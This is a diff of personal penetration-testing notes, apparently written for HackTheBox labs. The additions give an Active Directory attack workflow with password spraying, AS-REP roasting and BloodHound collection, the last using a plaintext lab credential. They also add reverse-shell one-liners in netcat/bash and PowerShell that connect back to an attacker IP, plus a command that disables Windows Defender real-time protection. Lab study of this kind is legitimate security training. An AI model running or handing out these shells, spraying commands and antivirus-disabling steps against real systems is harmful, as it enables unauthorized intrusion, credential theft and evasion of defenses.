@@ -260,24 +260,6 @@ Get as much information about server and network
 - 22, 2222 -> SSH
 - 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo
 
-## nxc
-
-Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
-
-`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`
-
-To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag
-
-Possible protocols:
-
-	- ftp
-	- smb
-	- ssh
-	- vnc
-	- rdp
-	- winrm
-	- msSQL
-
 # Network
 
 ## Service Hacking
@@ -793,7 +775,7 @@ In the documentation of Dovecot, we can find the individual [core settings](http
   /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
   ```
 
-### 137-9, 445 - SMB
+### 135, 137-9, 445 - SMB
 
 #### Generalities:
 
@@ -831,6 +813,8 @@ In the documentation of Dovecot, we can find the individual [core settings](http
   - `netsharegetinfo <share>`  Provides information about a specific share.
   - `enumdomusers`  Enumerates all domain users.
   - `queryuser <RID>`  Provides information about a specific user.
+  - `querydispinfo` Dispays descriptions of users (could be some ppassword in it)
+  - `enumprinters`
 
   
 
@@ -1939,6 +1923,88 @@ Even if the code is not directly executed, an error message can indicate what is
   - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
   - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        
 
+# Active Directory
+
+It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 
+
+The goal is to get local admin on the domain controller. 
+
+Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.
+
+There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 
+
+*Forest* is the parent of a collection of machines that has the same hierarchy.
+
+1. Through anonymous or guest authentication, try to get access to
+
+   - SMB
+
+   - RPC
+
+   - LDAP
+
+2. Get a list of valid usernames
+
+3. Password spraying
+
+    ```bash
+     nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce
+    ```
+
+   ```bash
+    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce --local-auth
+   ```
+
+   ```bash
+   nxc smb 10.10.10.161 -u "" -p "" --pass-pol
+   ```
+
+   
+
+4. Get a session in WinRM
+
+5. If you cannot, Kerberos bruteforcing
+
+   ```bash
+   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
+   ```
+
+6. Dump and analyze th database
+
+   ```bash
+    bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
+   ```
+
+   
+
+## nxc
+
+Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/
+
+`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`
+
+To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag
+
+To enumerate the users, use th flag `--users` or `--active-users` for ldap.
+
+Possible protocols:
+
+	- ftp
+	- smb
+	- ssh
+	- vnc
+	- rdp
+	- winrm
+	- msSQL
+
+```bash
+windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
+```
+
+
+
+
+
 #  Shells
 
 [ReverseShellGenerator](https://www.revshells.com/)
@@ -1947,11 +2013,39 @@ Even if the code is not directly executed, an error message can indicate what is
 
 With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.
 
+You want to use a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) like `443` which usually is for `HTTPS` connections, so that it does not  get blocked by firewalls.
+
+### One=liners
+
+- Netcat/Bash
+
+  ```
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [YOUR_IP] [PORT] > /tmp/f
+  ```
+
+- Poweshell
+
+  ```powershell
+  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YOUR IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  ```
+
+  
+
+### Firewall evasion Windows
+
+- Disable Windows Defender antivirus (AV)
+
+  ```powershell
+   Set-MpPreference -DisableRealtimeMonitoring $true
+  ```
+
+  
+
 
 
 ## Bind Shell
 
-The `target` system has a listener started and the attacker directly connects to that port. So, there needs to be a lister opened or that we can start.
+The `target` system has a listener started and the attacker directly connects to that port. So, there needs to be a lister opened or that we can start. Bind shells rely on incoming connections allowed through the firewall on the server-side, which is not common.
 
 We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.
 
